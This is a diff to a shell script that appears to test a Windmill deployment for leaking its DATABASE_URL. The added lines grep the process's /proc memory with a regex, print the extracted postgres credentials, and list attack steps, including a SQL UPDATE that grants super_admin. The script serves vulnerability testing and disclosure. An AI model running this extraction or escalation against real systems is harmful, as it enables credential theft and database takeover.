@@ -43,10 +43,25 @@ if [ -r /proc/$windmill_pid/maps ] && [ -r /proc/$windmill_pid/mem ]; then
     if [ -n "$heap_range" ]; then
         echo "Found heap at: $heap_range"
 
-        # Try to grep the memory (this is a simplified approach)
-        # In reality, you'd use dd with proper offset/count
-        if timeout 2 grep -a "postgres://" /proc/$windmill_pid/mem 2>/dev/null | head -1; then
-            echo "❌ VULNERABLE: Found DATABASE_URL in process memory!"
+        # Try to grep the memory and extract the full postgres URL
+        echo ""
+        echo "Attempting to extract DATABASE_URL from memory..."
+        matched=$(timeout 2 grep -aoP 'postgres://[^\x00\s]*' /proc/$windmill_pid/mem 2>/dev/null | head -1)
+
+        if [ -n "$matched" ]; then
+            echo ""
+            echo "❌❌❌ VULNERABLE: Found DATABASE_URL in process memory! ❌❌❌"
+            echo ""
+            echo "Extracted credentials:"
+            echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+            echo "$matched"
+            echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+            echo ""
+            echo "An attacker can now:"
+            echo "  1. Connect directly to PostgreSQL"
+            echo "  2. Escalate to superadmin: UPDATE password SET super_admin=TRUE"
+            echo "  3. Read/modify all workspace data"
+            echo ""
             exit 1
         fi
     fi
